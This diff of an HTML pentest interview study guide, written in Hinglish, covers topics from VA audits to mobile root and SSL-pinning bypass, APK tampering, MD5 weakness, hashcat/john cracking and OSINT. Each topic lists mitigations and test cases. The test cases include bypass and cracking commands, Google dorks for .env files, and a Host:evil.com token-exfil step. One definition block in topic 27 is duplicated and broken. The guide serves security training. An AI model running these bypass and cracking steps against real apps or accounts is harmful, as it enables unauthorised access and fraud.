+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>OTP endpoint ka sirf per-IP limit tha — attacker ne XFF rotate karke 10k OTP attempts kiye → 2FA bypass. Fix: per-user+per-IP+Redis sliding window + CAPTCHA escalation.</div>
+</section>
+
+<section class="topic" id="t26">
+<h2><span class="n">26</span>VACA — Vulnerability Assessment &amp; Configuration Audit</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>VACA (Vulnerability Assessment &amp; Configuration Audit) = <b>non-exploitative</b> security review: vulnerability scanning (Nessus/Qualys) + configuration audit against baselines (CIS benchmarks, hardening guides, compliance policies — PCI, ISO 27001). <b>Vulnerabilities/limitations of VA alone:</b> high false positives, no exploit validation (severity over-estimated), version-based checks miss config-specific risks, blind to business logic/authz issues, credential-less scans shallow, tool update lag (new CVEs missed), configuration fatigue (no context).</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Sirf VA par bharosa = false sense of security (business logic vulns miss) + wasted effort on FPs. VA + PT combination hi complete picture deta hai.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Combine VA with penetration testing (exploit validation).</li>
+<li>Triage process: manual verification of findings (FP filtering).</li>
+<li>Configuration baselines: automate CIS checks + drift detection.</li>
+<li>Continuous scanning + patch management with SLAs.</li>
+<li>Context-aware prioritization: asset criticality + exploitability.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>CIS scan: <code>lynis audit system</code> ya Nessus compliance template — baseline deviation.</li>
+<li>FP validation: finding verify karo manually (nmap/curl) — false positive list banao.</li>
+<li>Config review: open ports, default creds, file permissions, services running.</li>
+<li>Patch audit: installed versions vs known CVE feeds.</li>
+<li>Compare: VA report vs PT report — kya PT ne extra find kiya? (business logic).</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Client sirf VA karta tha — scanner ne "low" diya par IDOR (business logic) miss hua → data breach. Lesson: VA = coverage, PT = validation + logic. Complete VAPT is the answer.</div>
+</section>
+
+<section class="topic" id="t27">
+<h2><span class="n">27</span>Interesting / Critical Findings — Process &amp; Mitigation</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>Example
+
+<div class="def"><span class="lbl ld">Definition</span><br>Example process: finding mila → verify manually (reproduce) → assess business impact → severity (CVSS) → document PoC + remediation. Examples: SQLi to DB dump, IDOR to mass PII exposure, JWT alg:none to admin access, OTP brute to ATO, SSRF to cloud metadata keys. Critical = <b>exploitable + high impact + reachable</b>.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Ek critical = full compromise/breach. Reporting quality decides client action — clear PoC + business impact = faster fixes.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Har finding: reproducible steps + request/response + screenshots.</li>
+<li>Severity: CVSS v3 vector + business context (data sensitivity).</li>
+<li>Root cause fix, not symptom (parameterize, not just WAF).</li>
+<li>Immediate containment: rotate creds, block IOCs, revoke tokens.</li>
+<li>Retest after fix + regression testing.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Critical walkthrough: SQLi mila → DB user dump karo → PII confirm → exploitability + impact likho.</li>
+<li>Chain demo: XSS → CSRF → email change → ATO (full chain PoC).</li>
+<li>Evidence: Burp request/response export + screenshots with timestamps.</li>
+<li>CVSS: <code>nmap --script cvss</code> ya calculator se score justify karo.</li>
+<li>Remediation: developer ke saath root cause discuss karo, fix verify karo.</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>E-commerce pentest: IDOR (order IDs) se 50k orders ka PII + addresses mile — Critical CVSS 9.1, same-day emergency fix (authz check), 48hr mein patched + retested clean.</div>
+</section>
+
+<section class="topic" id="t28">
+<h2><span class="n">28</span>High-Severity Finding — Full Walkthrough (XSS, SQLi, CSRF, Host Header, ATO)</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>Interview answer framework — har vuln: <b>Process → Mitigation → How it addresses the vuln</b>. <b>XSS:</b> detect (payload test) → impact (session theft) → fix: output encoding + CSP + HttpOnly. <b>SQLi:</b> detect (quote/time-based) → impact (data dump) → fix: parameterized queries + least privilege. <b>CSRF:</b> detect (no token) → impact (state change) → fix: anti-CSRF token + SameSite. <b>Host header:</b> detect (reset link poisoning) → impact (ATO) → fix: Host allowlist + token binding. <b>Account takeover:</b> usually chain — XSS/OTP/IDOR → ATO → fix per root cause + re-auth for sensitive actions.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Interviewer yehi sunna chahta hai: systematic detection, real impact, aur root-cause mitigation — not just definition.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Fix root cause (encoding, parameterization, tokens, allowlists).</li>
+<li>Defense in depth: CSP, HttpOnly/SameSite, WAF, monitoring.</li>
+<li>Re-auth/OTP for sensitive actions (breaks chains).</li>
+<li>Session hygiene: rotate IDs, short expiry, revocation.</li>
+<li>Security testing in CI (SAST/DAST) — regressions roko.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>XSS walkthrough: payload → execution → cookie theft → report PoC.</li>
+<li>SQLi walkthrough: boolean/time-based confirm → DB fingerprint → dump limited sample → impact.</li>
+<li>CSRF walkthrough: PoC form → action executes → token fix verify.</li>
+<li>Host header: reset link Host:evil.com → token exfil → fix verify.</li>
+<li>ATO chain: XSS → CSRF token steal → email change → full account control.</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Interview answer: "Most critical was chained — stored XSS in profile + no SameSite → CSRF via XSS changed victim email → ATO. Mitigation: sanitization (DOMPurify), CSP nonce, SameSite=Strict, re-auth for email change; verified via retest."</div>
+</section>
+
+<!-- ==================== MOBILE & OS ==================== -->
+<h3 class="category">Mobile &amp; OS</h3>
+
+<section class="topic" id="t29">
+<h2><span class="n">29</span>Android Vulnerabilities — Full List &amp; Mitigations</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>Core list: <b>insecure storage</b> (plaintext prefs/DB), <b>weak crypto</b> (ECB, hardcoded keys), <b>SSL/TLS issues</b> (no pinning, cleartext), <b>rooted device exposure</b>, <b>exported components</b> (activities/services/receivers/providers), <b>WebView vulns</b> (JS bridge, file access), <b>intent injection/fuzz</b>, <b>tapjacking</b>, <b>backup abuse</b> (allowBackup), <b>debuggable builds</b>, <b>sensitive logging</b>, <b>hardcoded secrets</b>, <b>code tampering/repackaging</b>, <b>dynamic code loading</b> (unverified DEX), <b>content provider SQLi/traversal</b>, <b>broadcast theft/poisoning</b>, <b>insecure deep links</b> (auto-verify missing → phishing), <b>permission over-request</b>.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Data theft, ATO, malware injection, fraud on rooted/repackaged apps — mobile is now primary attack surface.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Android Keystore/EncryptedSharedPreferences for secrets; no hardcoding.</li>
+<li>Strong crypto (AES-GCM), TLS 1.2+, key pinning, no cleartext.</li>
+<li>exported=false default; signature permissions on exported components.</li>
+<li>WebView: JS off, no file access, allowlist URLs (Part 1 topic 46).</li>
+<li>Play Integrity + root/emulator detection + tamper checks server-side.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>jadx/apktool se manifest + strings review (hardcoded keys, exported, debuggable).</li>
+<li>adb: run-as, backup, logcat — storage + logs check.</li>
+<li>Burp + Frida: traffic + pinning bypass test.</li>
+<li>Drozer: providers, activities, broadcasts abuse (Part 1 topic 50).</li>
+<li>Repackage test: apktool rebuild + resign — app chalata hai? (integrity missing).</li>
+<li>Deep link: <code>adb shell am start -a android.intent.action.VIEW -d "app://vuln"</code> — injection.</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Mobile bank app: cleartext traffic + no pinning + plaintext token storage → rooted device par token steal → ATO. Fix: TLS+pin, Keystore, Play Integrity.</div>
+</section>
+
+<section class="topic" id="t30">
+<h2><span class="n">30</span>Integrity &amp; SDK Checks — Root Bypass Mitigations</h2>
+<div class="def"><span class="lbl ld">Definition</span><br><b>Integrity checks:</b> app ke code/state verify karte hain — APK signature check, DEX hash verification, certificate fingerprint match, Play Integrity API attestation, tamper detection (checksum of assets), runtime self-check (code signing at runtime). <b>SDK checks:</b> SafetyNet (legacy) / Play Integrity API (attestation — device integrity + app integrity, server-side verify), hardware-backed Keystore attestation (key origin proof), GMS availability check.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Bina integrity = repackaged malicious APK chal sakta hai (banking fraud). SDK attestation se rooted/emulator/custom-ROM devices flag hote hain.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Play Integrity API with <b>server-side verification</b> of attestation response.</li>
+<li>Signature verification: compare APK signature with expected (at runtime + at install via Play).</li>
+<li>DEX/asset checksums verified before sensitive flows.</li>
+<li>Hardware Keystore keys with attestation for crypto ops.</li>
+<li>Handle failure: degrade/block sensitive features, log + alert.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Repackage: apktool d → smali change → rebuild + sign — app detects tamper?</li>
+<li>Rooted device: Play Integrity response — basicIntegrity false aata hai?</li>
+<li>Server-side: attestation token verify karo (integrity API endpoint) — client-only check bypass hota hai?</li>
+<li>Frida: integrity checks hook karke bypass — server bhi check karta hai?</li>
+<li>Offline mode: app bina Google services chal par check skip karta hai?</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Banking app ki integrity check sirf client-side thi — attacker ne repackaged APK mein check hata diya → fraud app banaya. Fix: server-side Play Integrity verification.</div>
+</section>
+
+<section class="topic" id="t31">
+<h2><span class="n">31</span>Runtime Root Bypass Checks — How to Mitigate</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>Runtime checks jo app chalti waqt karti hai: <b>su binary detection</b> (<code>which su</code>, /system/xbin/su, /sbin/su), <b>Magisk detection</b> (package com.topjohnwu.magisk, magisk paths), <b>test-keys</b> (Build.TAGS contains test-keys), <b>busybox</b>, <b>root packages</b> (SuperSU), <b>/system write permission</b>, <b>dangerous props</b> (ro.debuggable=1), <b>Frida detection</b> (scan /proc/self/maps, ports 27042, named pipes), <b>debugger detection</b> (TracerPid != 0), <b>emulator detection</b> (build props, sensors), <b>native checks</b> (JNI C code — hard to bypass). <b>Mitigation:</b> multi-layer checks, obfuscate detection logic, delay checks (time-based, not at startup only), server-side attestation as final authority.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Rooted device par memory dump, pinning bypass, repackaging, fraud — checks missing ya bypassable = app data exposed.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Multiple redundant checks (file + package + prop + native).</li>
+<li>Native (NDK/C) checks — static analysis hard, hooking detect karo.</li>
+<li>Randomized check timing + non-blocking (async server-side verify).</li>
+<li>Play Integrity server-side attestation — client checks bonus only.</li>
+<li>React: degrade features, force update, alert SOC on repeated hits.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Magisk root device par app chalao — detection trigger hota hai?</li>
+<li>Magisk Hide/Shamiko se bypass — check fail hota hai? (obfuscation quality).</li>
+<li>Frida: <code>frida -f app</code> — app exit/detect karta hai? (maps scan).</li>
+<li>Objection: <code>android root disable</code> — root check bypass hua? server ne bhi check kiya?</li>
+<li>Native check: smali vs .so — C mein check hai? (jadx + IDA review).</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>App ka root check ek Java function tha — objection se hook karke bypass ho gaya; server-side Play Integrity add karne ke baad rooted devices block hue. Lesson: client checks hamesha bypassable — server final judge.</div>
+</section>
+
+<section class="topic" id="t32">
+<h2><span class="n">32</span>Root &amp; SSL Pinning Bypass Tools — Android &amp; iOS</h2>
+<div class="def"><span class="lbl ld">Definition</span><br><b>Android:</b> Magisk (root + hide), Magisk modules (systemless CA install), Frida (runtime hooking — <code>frida -U -f app -l pinning-bypass.js</code>), objection (<code>android sslpinning disable</code>, <code>android root disable</code>), Xposed modules (JustTrustMe, TrustMeAlready, RootCloak), APK patching (apktool → network_security_config), LSPosed, riru. <b>iOS:</b> jailbreak (unc0ver/checkra1n), Frida/objection (<code>ios sslpinning disable</code>), SSL Kill Switch 2, Cycript, Liberty Lite/Shadow (tweak-based bypass), installing Burp CA into system trust store (jailbreak only), Corellium (cloud jailbroken devices).</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Yeh tools MITM testing enable karte hain — bina inke traffic analysis ruk jati hai. Understanding bypass = understanding mitigation quality.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Pin public keys (SPKI) with backup pins + rotation plan.</li>
+<li>Pinning in native code, not JS/Java only (harder to hook).</li>
+<li>Detect Frida/Xposed/Magisk (maps, ports, packages).</li>
+<li>Server-side: monitor cert/anomalies, device attestation.</li>
+<li>Test bypasses yourself — assume attacker can bypass, minimize impact.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Frida pinning bypass script: <code>frida -U -f com.app -l ssl.js --no-pause</code> → Burp traffic visible?</li>
+<li>objection: <code>objection -g com.app explore</code> → <code>android sslpinning disable</code>.</li>
+<li>Magisk: system CA module install → Burp cert trusted (Android 7+).</li>
+<li>iOS: jailbroken device + SSL Kill Switch 2 → Burp capture.</li>
+<li>Bypass detection: Frida check kaunsi layers par hai? native bhi?</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Fintech app cert pinning tha — Frida script se bypass → Burp mein traffic mila → JWT token header mein tha → IDOR test successful. Fix: key pinning + anti-Frida + attestation.</div>
+</section>
+
+<section class="topic" id="t33">
+<h2><span class="n">33</span>How to Root an Android Device (For Testing)</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>Rooting = su access lena (system-level control). <b>Steps (typical):</b> <b>1. Unlock bootloader</b> (vendor tool — fastboot flashing unlock; data wipe hota hai) → <b>2. Flash custom recovery</b> (TWRP: <code>fastboot flash recovery twrp.img</code>) → <b>3. Flash root package</b> (Magisk zip via TWRP, ya patched boot.img: <code>magisk patch boot.img</code> → <code>fastboot flash boot patched_boot.img</code>) → <b>4. Verify</b> (<code>adb shell su</code>, Magisk app). Modern approach: Magisk is standard (systemless root + hide). Alternatives: KingRoot (older devices), SuperSU (legacy). <b>Testing note:</b> root sirf test devices par — production phones risk/data loss, warranty void.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Root = full device control — app data access, pinning bypass, memory dump, repackaging. Pentester ke liye: root enables deep mobile testing.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>App side: root detection + Play Integrity (topics 30-31).</li>
+<li>Server side: attestation + anomaly detection (device fingerprint).</li>
+<li>Keystore hardware keys — rooted device par bhi keys secure.</li>
+<li>MDM policy: rooted devices block karo (enterprise).</li>
+<li>User awareness: rooting risks (banking fraud, malware).</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Device model check: <code>adb shell getprop ro.product.model</code>; bootloader: <code>adb reboot bootloader</code>.</li>
+<li>Unlock: <code>fastboot oem unlock</code> / <code>fastboot flashing unlock</code> (vendor-specific).</li>
+<li>Magisk: boot.img extract (stock ROM) → <code>magisk patch boot.img</code> → <code>fastboot flash boot</code>.</li>
+<li>Verify: <code>adb shell su -c id</code> — uid=0?</li>
+<li>Magisk app: modules install (system CA, hide) — test device ready.</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Pixel test device: bootloader unlock → Magisk patched boot → rooted — phir Frida/objection se banking app ka pinning bypass + memory dump kiya (authorized lab).</div>
+</section>
+
+<section class="topic" id="t34">
+<h2><span class="n">34</span>How to Manually Modify Static Settings in Android</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>"Static settings" = app/resources par direct modification: <b>APK modification:</b> apktool d (decode) → smali/resources edit → apktool b (rebuild) → zipalign + apksigner sign → install. <b>What to change:</b> AndroidManifest.xml (debuggable, allowBackup, exported, permissions), network_security_config.xml (cleartext/CA), smali checks hatao (root detection, pinning), strings (URLs, flags), resources (booleans — isAdmin, feature flags). <b>System settings:</b> <code>adb shell settings put global/secure ...</code> (stay_on_while_plugged_in, install_non_market_apps), <code>setprop</code> (ro.debuggable needs root), build.prop edits (root).</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Manifest/resources tamper se security controls bypass (debug, backup, export, checks) — repackaged apps = fraud/ABuse surface. Build-property changes = app behavior manipulation.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Signature verification at runtime + Play Integrity (tamper detect).</li>
+<li>Release: debuggable=false, allowBackup=false, minify, no test flags.</li>
+<li>Server-side checks: never trust client flags/config (feature flags server-driven).</li>
+<li>Anti-tamper: DEX checksums, native integrity checks.</li>
+<li>Play Protect + enterprise MDM policy for sideloading block.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>apktool: <code>apktool d app.apk</code> → AndroidManifest edit (debuggable=true) → <code>apktool b</code> → <code>apksigner sign</code> → install — app chalati hai? (signature check missing).</li>
+<li>Smali patch: root check function return true karwao — detection bypass.</li>
+<li>network_security_config: cleartext allow karo — HTTP traffic capture.</li>
+<li>Resources: boolean isAdmin=true modify karke rebuild — server react karta hai?</li>
+<li>settings: <code>adb shell settings put global stay_on_while_plugged_in 3</code> — persistence test.</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>App mein feature flag "isPro=true" resource mein tha — apktool se modify + rebuild + resign → pro features unlock → server ne verify nahi kiya. Fix: server-side entitlement check.</div>
+</section>
+
+<section class="topic" id="t35">
+<h2><span class="n">35</span>iOS Development — Swift vs Objective-C</h2>
+<div class="def"><span class="lbl ld">Definition</span><br><b>Swift</b> (2014, Apple ka modern language): type-safe, protocol-oriented, optionals (nil-safety), memory safe (ARC), faster development, interops with ObjC; <b>Objective-C</b> (1984): C superset, dynamic messaging, runtime swizzling, older codebases (banks, legacy apps), manual memory (MRC)/ARC. <b>Current:</b> naye apps Swift mein; purani codebases ObjC — hybrid apps dono use karte hain. Security testing relevance: ObjC apps mein method swizzling (runtime manipulation) common; Swift zyada static-safe lekin <b>@objc</b> exposed functions bhi swizzle ho sakte hain; both vulnerable to jailbreak/insecure storage if not hardened. Frameworks: UIKit (older), SwiftUI (new), Combine, CoreData, Keychain (secure storage — better than Android defaults).</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Interview me: language knowledge + security implications (runtime swizzling attack surface, Keychain vs UserDefaults storage, jailbreak detection libraries).</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Store secrets in Keychain (not UserDefaults/NSUserDefaults).</li>
+<li>Jailbreak detection (libhooker/Frida checks) + server-side attestation (DeviceCheck/App Attest).</li>
+<li>ATS (App Transport Security): HTTPS only, pinning via URLSession delegate.</li>
+<li>Disable third-party keyboards/background screenshot for sensitive screens.</li>
+<li>Code signing + App Store review + integrity (jailbreak → degrade).</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Decompile: class-dump / Hopper / IDA — strings mein keys/tokens.</li>
+<li>Keychain dump: <code>frida</code> / objection <code>ios keychain dump</code> (jailbroken).</li>
+<li>Swizzle test: Frida se method hook — auth check bypass hota hai?</li>
+<li>ATS: Info.plist mein NSAllowsArbitraryLoads? (cleartext allowed?).</li>
+<li>Jailbreak detection bypass: Liberty Lite / Frida — server bhi check karta hai?</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Legacy banking iOS app (ObjC) — UserDefaults mein token stored + no jailbreak check → jailbroken device par keychain/NSUserDefaults dump se token steal → ATO. Fix: Keychain + App Attest.</div>
+</section>
+
+<section class="topic" id="t36">
+<h2><span class="n">36</span>Mobile Testing Approach (Android &amp; iOS)</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>Structured: <b>1. Setup:</b> test device (rooted/jailbroken + clean), proxy (Burp + CA), Frida/objection, app + source (jadx/class-dump). <b>2. Static:</b> manifest/plist review, hardcoded secrets, weak crypto, exported components, permissions (topics 29, 42 Part 1). <b>3. Dynamic:</b> traffic analysis (Burp — pinning bypass), runtime hooks (Frida), memory dump, storage inspection (run-as/keychain), deep links, exported component abuse (Drozer). <b>4. Server/API:</b> app ke APIs par web testing (IDOR, authz, injection) — app is just a client. <b>5. Platform:</b> root/jailbreak behavior, backup, logs, screen capture. <b>6. Report:</b> per finding — device, steps, impact, fix.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Complete approach = client + server + platform coverage — mobile pentest mein sabse zyada miss server-side testing hota hai (app client hai, API asli data hai).</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>App side: storage/transport hardening (Keystore, TLS+pin, WebView rules).</li>
+<li>API side: same web security (authz, rate limit, injection).</li>
+<li>Platform: root detection + Play Integrity/App Attest.</li>
+<li>CI: MobSF in pipeline + dependency scanning.</li>
+<li>Retest policy: every release, critical paths first.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Static: MobSF run karo → findings list, phir jadx se manual verify.</li>
+<li>Dynamic: Burp + Frida pinning bypass → traffic capture → API endpoints note karo.</li>
+<li>API: captured endpoints ko web VAPT checklist se test karo (IDOR, authz).</li>
+<li>Storage: run-as/adb backup (Android), keychain dump (iOS).</li>
+<li>Deep links/exported: Drozer + am start fuzz.</li>
+<li>Root behavior: rooted device par sensitive flows — block/degrade hota hai?</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Mobile app test: app hi safe laga (pin strong) — par API mein IDOR tha jo app UI se hidden tha; Burp capture + direct API call se 10k users ka PII. Lesson: hamesha server-side test karo.</div>
+</section>
+
+<!-- ==================== CRYPTO & MISC ==================== -->
+<h3 class="category">Crypto &amp; Misc</h3>
+
+<section class="topic" id="t37">
+<h2><span class="n">37</span>Why MD5 Is Weak</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>MD5 (128-bit) weaknesses: <b>collision attacks</b> (two different inputs, same hash — practical since 2004/2007, cheap GPU clusters; chosen-prefix collisions: <code>hashclash</code>/<code>fastcoll</code>), <b>preimage resistance weak</b> (theoretical 2^123, but collision enough for certs/files), <b>extremely fast</b> (hashcat ~10+ GH/s — password cracking trivial), <b>no salt support by design</b>, <b>length extension</b> (HMAC misuse). SHA-1 bhi deprecated (SHAttered 2017). <b>Use:</b> SHA-256/384 (integrity), bcrypt/Argon2/scrypt (passwords), HMAC-SHA256 (authenticity).</div>
+<div class="impact"><span class="lbl li">Impact</span><br>MD5 password hashes = instant crack; MD5 file signatures = forged files pass verification; MD5 certs (CVE-2008-5078 class) = CA forgery.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Passwords: Argon2id/bcrypt (cost factor tuned) with per-user salt.</li>
+<li>Integrity: SHA-256/384 + signature (RSA/Ed25519).</li>
+<li>HMAC: HMAC-SHA256 with secret — never MD5.</li>
+<li>Migration: rehash passwords on next login (upgrade path).</li>
+<li>Scan: detect MD5 usage (SAST + code review) and replace.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Hash identify: <code>hashid '5f4dcc3b5aa765d61d8327deb882cf99'</code> → MD5.</li>
+<li>Crack: <code>hashcat -m 0 hash.txt rockyou.txt</code> — seconds mein crack hote hain?</li>
+<li>Collision demo: <code>fastcoll</code> se two files same MD5 (lab).</li>
+<li>Length extension: <code>hash_extender</code> se MD5-HMAC forge (lab).</li>
+<li>DB audit: password column hash format check karo — MD5/unsalted?</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>DB breach mein 1M MD5 hashes — hashcat se 78% crack hue (rockyou) kyunki fast + unsalted. Fix: Argon2id migration + breach notification.</div>
+</section>
+
+<section class="topic" id="t38">
+<h2><span class="n">38</span>Password Cracking — hashcat &amp; John the Ripper</h2>
+<div class="def"><span class="lbl ld">Definition</span><br><b>hashcat</b> (GPU): modes — <code>-m 0</code> MD5, <code>-m 1000</code> NTLM, <code>-m 3200</code> bcrypt, <code>-m 13100</code> Argon2, <code>-m 22000</code> WPA-PBKDF2; attacks — dictionary (<code>-a 0</code>), combinator (<code>-a 1</code>), mask (<code>-a 3</code>), hybrid (<code>-a 6/7</code>), rules (<code>-r</code>). <b>john</b> (CPU, versatile): <code>john --wordlist=rockyou.txt hash.txt</code>, <code>--format=</code>, incremental, rules (dive, best64), zip/ssh/keepass formats. <b>Workflow:</b> hash extract (dump/responder) → format identify (hashid) → wordlist+rule (rockyou, cewl target-specific) → mask for structure (password?d) → analyze cracked passwords for reuse patterns.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Weak hashes + weak passwords = credential compromise; cracked passwords often reused across systems (pivot).</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Argon2id/bcrypt with cost — cracking slow (hashcat 10k/s not 10G/s).</li>
+<li>Enforce length over complexity (NIST: 8+ chars, passphrases), breached-password check.</li>
+<li>MFA — cracked password useless alone.</li>
+<li>Never reuse passwords; enterprise: SSO + password manager policy.</li>
+<li>Monitor dark web/breach feeds for corporate creds.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Identify: <code>hashid '$2y$10$...'</code> → bcrypt (m 3200).</li>
+<li>Crack: <code>hashcat -m 3200 hash.txt rockyou.txt -r rules/best64.rule</code>.</li>
+<li>Mask: <code>hashcat -m 1000 -a 3 ntlm.txt '?u?l?l?l?d?d'</code> — structure guess.</li>
+<li>John zip: <code>zip2john file.zip &gt; h.txt; john h.txt</code>.</li>
+<li>cewl: <code>cewl https://company.com -w words.txt</code> — target-specific wordlist.</li>
+<li>Compare: same hash in MD5 vs bcrypt — time difference demo.</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>NTLM hashes from internal test — hashcat rockyou+rule se admin crack hua; same password domain-wide reuse mila → domain admin. Fix: password policy + MFA + hashcat-resistant hashing.</div>
+</section>
+
+<section class="topic" id="t39">
+<h2><span class="n">39</span>CSRF Token — Where to Pass in Request</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>Anti-CSRF token pass karne ke standard places: <b>1. Hidden form field</b> (<code>&lt;input type="hidden" name="csrf_token"&gt;</code>) — synchronizer token pattern; <b>2. Custom header</b> (<code>X-CSRF-Token</code>) — AJAX/SPA/JSON APIs (attacker's cross-site JS can't set custom headers without CORS preflight approval); <b>3. Both</b> — defense in depth. <b>Rules:</b> token server-side session se bound (not just static cookie), random 128-bit, per-session/per-request, validate on every state-changing method (POST/PUT/DELETE/PATCH), never GET. Double-submit cookie pattern: same token in cookie + header, server compares.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Galt jagah/validation = CSRF possible. Token in URL (GET) = referer leak. Token validation sirf form par = API endpoints unprotected.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Hidden field + server-side session binding (synchronizer pattern).</li>
+<li>Custom header (X-CSRF-Token) for APIs/SPA — CORS preflight blocks attackers.</li>
+<li>Validate method: no state changes via GET.</li>
+<li>SameSite=Lax/Strict cookie as second layer.</li>
+<li>Rotate token on login; bind to session, not global static value.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Form mein token missing? — CSRF PoC form se test (Part 1 topic 31).</li>
+<li>Token static? — logout/login par change hota hai?</li>
+<li>Token validation: galat/empty token bhejo — server reject karta hai?</li>
+<li>API endpoint: header token required hai ya form token bhi kaam karta hai?</li>
+<li>Referer check: token URL mein hai? (leak risk).</li>
+<li>SameSite bypass: subdomain par cookie injectable? token bhi check hota hai?</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>JSON API ne sirf form-token validate kiya, header variant nahi — attacker ne same-origin form POST se token reuse karke CSRF kiya. Fix: per-request header token + session binding.</div>
+</section>
+
+<section class="topic" id="t40">
+<h2><span class="n">40</span>OSINT — Passive Reconnaissance Techniques</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>OSINT = publicly available info se target mapping (bina target ko touch kiye): <b>DNS</b> (crt.sh certificate transparency, SecurityTrails, dnsdumpster), <b>subdomains</b> (subfinder, amass, virustotal), <b>Google dorks</b> (<code>site:target.com filetype:pdf</code>, <code>inurl:admin</code>, <code>intitle:"index of"</code>), <b>GitHub</b> (code search: api keys, .env commits), <b>Shodan/Censys</b> (exposed services, banners), <b>LinkedIn/people</b> (employee info → spear phishing), <b>theHarvester</b> (emails), <b>Wayback Machine</b> (old pages/endpoints), <b>pastebin/leaks</b>, <b>social media</b>, <b>WHOIS</b> (registrant info).</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Passive recon se attack surface pata chalta hai bina detection ke — emails for phishing, subdomains for takeover, leaked secrets for direct access.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Minimize exposure: no internal docs/public shares, privacy on WHOIS.</li>
+<li>Secret scanning: gitleaks in CI + rotate any leaked keys.</li>
+<li>Monitor: Google alerts, GitHub notifications, Shodan for your assets.</li>
+<li>Subdomain hygiene: remove dangling/unknown records (takeover risk).</li>
+<li>Awareness: LinkedIn/social info ke through spear phishing — train staff.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Subdomains: <code>subfinder -d target.com</code> + crt.sh check karo.</li>
+<li>Dorks: <code>site:target.com filetype:env</code>, <code>site:target.com inurl:php?id=</code>.</li>
+<li>GitHub: <code>git clone</code> target org repos + <code>gitleaks</code> scan.</li>
